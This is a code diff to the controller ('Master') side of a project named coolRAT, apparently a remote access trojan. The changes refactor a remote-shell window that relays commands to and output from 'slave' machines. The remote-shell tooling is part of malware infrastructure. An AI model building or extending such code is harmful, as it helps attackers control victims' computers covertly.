@@ -1,4 +1,5 @@
 ﻿using coolRAT.Libs;
+using coolRAT.Libs.Connections;
 using coolRAT.Libs.Packets;
 using System;
 using System.Collections.Generic;
@@ -10,6 +11,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using static coolRAT.Libs.Connections.DualTcpConnection;
 
 namespace coolRAT.Master
 {
@@ -19,6 +21,7 @@ namespace coolRAT.Master
         public Client RemoteClient;
         public StringBuilder Input_Buffer;
         public Buffer_Timeout_Clock Buffer_Timeout_Clock;
+        public ShellEmulator_PacketHandler ShellEmulator_PacketHandler;
         public ShellWindow(Guid shell_uniqueId, Client client)
         {
             InitializeComponent();
@@ -26,8 +29,8 @@ namespace coolRAT.Master
             RemoteClient = client;
             Input_Buffer = new StringBuilder();
             Buffer_Timeout_Clock = new Buffer_Timeout_Clock(client, 100);
-
             Buffer_Timeout_Clock.Buffer = Input_Buffer;
+            ShellEmulator_PacketHandler = new ShellEmulator_PacketHandler(ShellEmulator, RemoteClient);
             Task.Run(() => Buffer_Timeout_Clock.Clock_Tick());
             // Let the slave know that the master's shell emulator is ready
             this.Text = $"[Connected] Remote shell of client {RemoteClient.UniqueId}; Shell Id: {Shell_UniqueId}";
@@ -38,8 +41,8 @@ namespace coolRAT.Master
             Task.Run(() =>
             {
                 Thread.Sleep(500);
-                SetShellStatePacket setShellState = new SetShellStatePacket(SlaveClient.UniqueId, Shell_UniqueId, ShellState.Running);
-                Shell_Connection.SendPacket(setShellState);
+                SetShellStatePacket setShellState = new SetShellStatePacket(RemoteClient.UniqueId, Shell_UniqueId, ShellState.Running);
+                RemoteClient.SendPacket(setShellState);
             });
 
         }
@@ -70,21 +73,22 @@ namespace coolRAT.Master
 
         private void ShellWindow_FormClosing(object sender, FormClosingEventArgs e)
         {
-            DisconnectShellPacket setShellStatePacket = new DisconnectShellPacket(SlaveClient.UniqueId, Shell_UniqueId);
-            Shell_Connection.SendPacket(setShellStatePacket);
+            DisconnectShellPacket setShellStatePacket = new DisconnectShellPacket(RemoteClient.UniqueId, Shell_UniqueId);
+            RemoteClient.SendPacket(setShellStatePacket);
+            RemoteClient.DeregisterPacketHandler("Shell_IO_ChangedPacket");
         }
     }
 
     public class Buffer_Timeout_Clock
     {
-        public Client Shell_Connection;
+        public Client RemoteClient;
         public StringBuilder Buffer;
         public bool ResetClock;
         public int Buffer_Timeout = 100;
 
-        public Buffer_Timeout_Clock(TcpConnection shell_Connection, int buffer_Timeout)
+        public Buffer_Timeout_Clock(Client remoteClient, int buffer_Timeout)
         {
-            Shell_Connection = shell_Connection;
+            RemoteClient = remoteClient;
             Buffer = new StringBuilder();
             ResetClock = false;
             Buffer_Timeout = buffer_Timeout;
@@ -99,8 +103,8 @@ namespace coolRAT.Master
                 {
                     if (Buffer.Length == 0) continue;
                     // Send buffer contents to the remote shell
-                    Shell_IO_ChangedPacket shell_IO_Changed = new Shell_IO_ChangedPacket(ChangeType.Input, Buffer.ToString());
-                    Shell_Connection.SendPacket(shell_IO_Changed);
+                    Shell_IO_ChangedPacket shell_IO_Changed = new Shell_IO_ChangedPacket(RemoteClient.UniqueId, ChangeType.Input, Buffer.ToString());
+                    RemoteClient.SendPacket(shell_IO_Changed);
                     Buffer.Clear();
                 }
                 else
@@ -109,25 +113,28 @@ namespace coolRAT.Master
         }
     }
 
-    public class ShellEmulator_PacketHandler : PacketHandler
+    public class ShellEmulator_PacketHandler
     {
         RichTextBox ShellEmulator;
+        Client RemoteClient;
 
-        public ShellEmulator_PacketHandler(RichTextBox shellEmulator, TcpConnection connection) : base(connection)
+        public ShellEmulator_PacketHandler(RichTextBox shellEmulator, Client remoteClient)
         {
             ShellEmulator = shellEmulator;
+            RemoteClient = remoteClient;
+            RemoteClient.RegisterPacketHandler("Shell_IO_ChangedPacket", HandlePacket);
         }
 
-        public override void HandlePacket(object sender, string packet_raw)
+        public void HandlePacket(object sender, PacketReceivedEventArgs e)
         {
-            Packet packet = Packet.Deserialize(packet_raw);
+            Packet packet = Packet.Deserialize(e.RawPacket);
             if (packet.Type == "Shell_IO_ChangedPacket")
             {
-                Shell_IO_ChangedPacket shell_IO_changed = Shell_IO_ChangedPacket.Deserialize(packet_raw);
+                Shell_IO_ChangedPacket shell_IO_changed = Shell_IO_ChangedPacket.Deserialize(e.RawPacket);
                 if (shell_IO_changed.ChangeType == ChangeType.Output)
                 {
                     ShellEmulator.Parent.Invoke(new Action(() => {
-                        char[] char_arr = shell_IO_changed.Change.ToCharArray();
+                        char[] char_arr = shell_IO_changed.Change.TrimEnd(new char[] { '\n' }).ToCharArray();
                         foreach (char chr in char_arr)
                         {
                             switch (chr)
